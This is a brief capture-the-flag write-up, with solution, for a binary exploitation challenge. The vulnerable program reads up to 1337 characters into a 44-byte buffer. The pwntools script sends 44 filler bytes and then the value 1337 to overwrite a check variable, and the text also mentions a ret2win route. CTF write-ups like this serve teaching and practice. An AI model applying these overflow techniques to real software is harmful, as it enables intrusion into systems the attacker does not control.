# Morris Worm
## Challenge
This challenge reads 1337 characters from **stdin** and stores them in an **array of chars**, it then checks if a variable is 1337 and if so we get the flag, the problem is that the value of the variable is 69 and it doesn't change.
The array of chars, however, is only **44 bytes long** and we can write more than that, so it is vulnerable to **buffer-overflow**, we just need to fill the array and then insert 1337 using [p32](https://docs.pwntools.com/en/stable/util/packing.html) to correctly **overwrite the variable**.
It is also possible to exploit the challenge using a ret2win attack, leveraging the buffer overflow vulnerability and the absence of PIE (Position Independent Executable) in the binary.

## Solution
```py
#!/usr/bin/env python3
from pwn import *

# Change this to remote if you want to run it on remote server
if args.REMOTE:
    r = remote('localhost', 1337) # change host and port
else:
    r = process('./pwn1')

PAYLOAD = b'A' * 44 + p32(1337)
r.recvuntil(b'?\n')
r.sendline(PAYLOAD + b'\x00')

r.interactive()
```

## Author
**Author**: [`@AlBovo`](https://github.com/AlBovo/) <br>
**Date**: 2024-07-19 <br>
**Category**: Binary Exploitation